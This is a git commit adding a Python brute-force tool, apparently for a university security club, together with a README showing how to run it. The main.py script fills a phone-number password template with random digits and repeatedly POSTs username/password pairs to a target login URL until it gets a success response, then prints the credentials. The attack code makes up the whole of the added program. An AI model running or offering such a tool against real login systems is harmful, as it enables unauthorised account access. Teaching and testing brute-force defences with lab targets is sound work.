9c815ec7a679947d11c5752d1b7af4033db559b6
Nonpawit Pothinil <nonpawit.p@outlook.com>
2024-05-14 17:04:21 +0700

    update mosk

--- README.md
+++ README.md
@@ -2,8 +2,17 @@
 
 <img src="./image.png">
 
-<p>$ git clone https://github.com/passapol146990/MSUSecurityClub-Tool-BruteForceAttackTesting.git</p>
-<hr>
-<h2>How to run.</h2>
-<p>1.start file MSU-BruteForceAttack.exe</p>
-<p>2.python run MSU-BruteForceAttack.py</p>
+# How to run
+
+-   type `pip install -r requirements.txt`
+-   type `python main.py -h` to see help
+
+# How to run if don't have python
+
+-   Download Bruteforce.exe on releases
+-   Open Command Prompt with same path of Bruteforce.exe
+-   type `Bruteforce -h` to see help
+
+# Example Command
+
+-   python main.py -u a@a.com -p 0987***321 -m POST http://example.com/login
---
+++ main.py
@@ -0,0 +1,94 @@
+import requests as req
+import argparse
+import random
+from logo import showLogo
+
+def generatePhone(template: str):
+  rng = [str(random.randint(0, 9)) for _ in range(template.count("*"))]
+
+  for number in rng:
+    template = template.replace("*", number, 1)
+  
+  return template
+
+def argumentParser():
+  parser = argparse.ArgumentParser(description="Bruteforce example for MSU Cybersecurity Club")
+
+  parser.add_argument(
+    "-m",
+    "--method",
+    choices=["GET", "POST"],
+    default="GET",
+    type=str,
+    help="HTTP method to use"
+  )
+
+  parser.add_argument(
+    "-u",
+    "--username",
+    type=str,
+    help="Username or email or either"
+  )
+
+  parser.add_argument(
+    "-p",
+    "--password",
+    type=str,
+    help="Password to bruteforce Ex.0987***21, 0-9 will replace to (*)"
+  )
+
+  parser.add_argument(
+    "-v",
+    "--verbose",
+    action="store_true",
+    help="Verbose bruteforce"
+  )
+
+  parser.add_argument(
+    "url",
+    metavar="URL",
+    type=str,
+    help="Target url to bruteforce"
+  )
+
+  return parser.parse_args()
+
+def main():
+  showLogo()
+  argument = argumentParser()
+  argUrl: str  = argument.url
+  argMethod: str = argument.method
+  argUsername: str = argument.username
+  argPassword: str = argument.password
+
+  if argMethod.lower() == "get":
+    try:
+      res = req.get(argUrl)
+      print(res.json())
+    except req.exceptions.MissingSchema:
+      print("It isn't URL!")
+
+  if argMethod.lower() == "post":
+    memo = []
+    while True:
+      password = generatePhone(argPassword)
+
+      if password in memo:
+        continue
+
+      jBody = {"username": argUsername, "password": password}
+      res = req.post(argUrl, json=jBody)
+      
+      if argument.verbose:
+        print(password)
+      memo.append(password)
+
+      print(f">> {password} List:{len(memo)}",end="\r")
+      if res.json()["status"] == 200:
+        print(f"Username is: {argUsername}")
+        print(f"Password is: {password}")
+        break
+      
+
+if __name__ == "__main__":
+  main()
